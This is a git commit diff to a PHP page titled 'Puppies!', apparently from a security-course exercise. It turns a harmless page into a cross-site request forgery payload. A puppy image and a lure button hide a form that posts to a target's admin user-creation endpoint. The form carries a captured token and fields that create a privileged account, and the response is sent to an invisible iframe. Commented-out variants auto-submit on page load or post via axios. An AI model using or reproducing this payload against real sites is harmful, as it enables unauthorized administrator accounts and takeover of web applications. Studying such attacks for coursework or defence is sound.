10b37ac1990272561e2f86439f0f8559fc125134
smackflad <ask.kalamakhs@hotmail.com>
2022-05-07 18:35:56 +0300

    updated puppies

--- puppies/index.php
+++ puppies/index.php
@@ -1,58 +1,77 @@
 <html>
 <head>
-    <script type="text/javascript">
-        function confirmation (name) {
-            if (confirm("Σημείωση: Το αρχείο " + name + " θα διαγραφεί μόνο από τον κατάλογό σας" )) {
-                return true;
-            } else {
-                return false;
-            }
-            return true;
-        }
-
-        function confirmationall (name) {
-            if (confirm("Σημείωση: Τα αρχεία θα διαγραφούν μόνο από τον κατάλογό σας" )) {
-                return true;
-            } else {
-                return false;
-            }
-            return true;
-        }
-
-        function confirmsend (){
-            if (confirm("Send content files to individual destinations ?")) {
-                return true;
-            } else {
-                return false;
-            }
-            return true;
-        }
-
-        function checkForm (frm) {
-            if (frm.elements["recipients[]"].selectedIndex < 0) {
-                alert("Παρακαλούμε επιλέξτε το χρήστη στον οποίο θέλετε να σταλεί το αρχείο.");
-                return false;
-            } else if (frm.file.value == "") {
-                alert("Δεν έχετε επιλέξει κάποιο αρχείο για να ανεβάσετε.");
-                return false;
-            } else {
-                return true;
-            }
-        }
-    </script>
+<!--    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js"></script>-->
+<!--    <script type="text/javascript">-->
+<!--        axios.post("http://localhost:8001/modules/admin/newuseradmin.php", {-->
+<!--            nom_form: "pp3f",-->
+<!--            prenom_form: "pp3l",-->
+<!--            uname: "pp4",-->
+<!--            password: "4321",-->
+<!--            email_form: "pp3@mail.com",-->
+<!--            department: 1,-->
+<!--            comment: "eerer",-->
+<!--            language: "el",-->
+<!--            submit: "Υποβολή",-->
+<!--            rid: 50,-->
+<!--            pstatut: 1,-->
+<!--            auth: 1-->
+<!--        }).then(function (response) {-->
+<!--            console.log(response)-->
+<!--            // do whatever you want if console is [object object] then stringify the response-->
+<!--        })-->
+<!--    </script>-->
 </head>
-    <body>
+<body>
+<!--<body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">-->
         <h1><?= "Puppies!" ?></h1>
         <img src="https://i.ytimg.com/vi/DhpYAyVsFXQ/hqdefault.jpg"></img>
-        <form action='http://localhost:8001/modules/user/user.php' method='get'>
-            <input type="text" name="unregister" value="11"/>
-            <input type="text" name="_token" value="a999fb61eb1e67b48e518699c336b0dc"/>
-            <input type="submit"/>
-            <br/></form>
-    </body>
+<form id="myForm" name="myForm" action="
+http://avadahackdavra.csec.chatzi.org/modules/admin/newuseradmin.php?id=50
+" method="POST"
+      target="output_frame">
+    <input class="FormData_InputText" type="hidden" name="nom_form" value="pp4f">
+    <input class="FormData_InputText" type="hidden" name="prenom_form" value="pp4l">
+    <input class="FormData_InputText" type="hidden" name="uname" value="pp10">
+    <input class="FormData_InputText" type="hidden" name="password" value="4321">
+    <input class="FormData_InputText" type="hidden" name="email_form" value="pp4@mail.com">
+    <input type="hidden" name="department" value="1">
+    <input class="FormData_InputText" type="hidden" name="comment" value="iuhiu">
+    <input type="hidden" name="language" value="el">
+    <input type="hidden" name="_token" value="4be764f758a8f200dc5d9983025241df">
+    <input type="submit" name="submit" value="click me to show me how much you love puppies!">
+    <input type="hidden" name="rid" value="50">
+    <input type="hidden" name="pstatut" value="1">
+    <input type="hidden" name="auth" value="1">
+</form>
+<iframe name="output_frame" src="" id="output_frame" width="0" height="0">
+</iframe>
+</body>
 </html>
-
-<?php
-print_r(sprintf('%08x', time())."\n");
-//print_r(time());
-?>
+<!--<body>-->
+<!--        <form name="myForm" id="myForm" target="_myFrame" action="http://localhost:8001/modules/admin/newuseradmin.php" method="post">-->
+<!--            <input class="FormData_InputText" type="text" name="nom_form" value="pp4f">-->
+<!--            <input class="FormData_InputText" type="text" name="prenom_form" value="pp4l">-->
+<!--            <input class="FormData_InputText" type="text" name="uname" value="pp4">-->
+<!--            <input class="FormData_InputText" type="text" name="password" value="4321">-->
+<!--            <input class="FormData_InputText" type="text" name="email_form" value="pp4@mail.com">-->
+<!--            <select name="department" class="auth_input">-->
+<!--                <option selected="" value="1">Τμήμα 1</option>-->
+<!--                <option value="2">Τμήμα 2</option>-->
+<!--                <option value="3">Τμήμα 3</option>-->
+<!--                <option value="4">Τμήμα 4</option>-->
+<!--                <option value="5">Τμήμα 5</option>-->
+<!--            </select>-->
+<!--            <input class="FormData_InputText" type="text" name="comment" value="iuhiu">-->
+<!--            <select name="language" class="auth_input">-->
+<!--                <option selected="" value="el">Ελληνικά</option>-->
+<!--                <option value="en">English</option>-->
+<!--                <option value="es">Español</option>-->
+<!--            </select>-->
+<!--            <input type="hidden" name="_token" value="4be764f758a8f200dc5d9983025241df">-->
+<!--            <input type="submit" name="submit" value="Υποβολή">-->
+<!--            <input type="hidden" name="rid" value="50">-->
+<!--            <input type="hidden" name="pstatut" value="1">-->
+<!--            <input type="hidden" name="auth" value="1">-->
+<!--        </form>-->
+<!--    </body>-->
+</html>
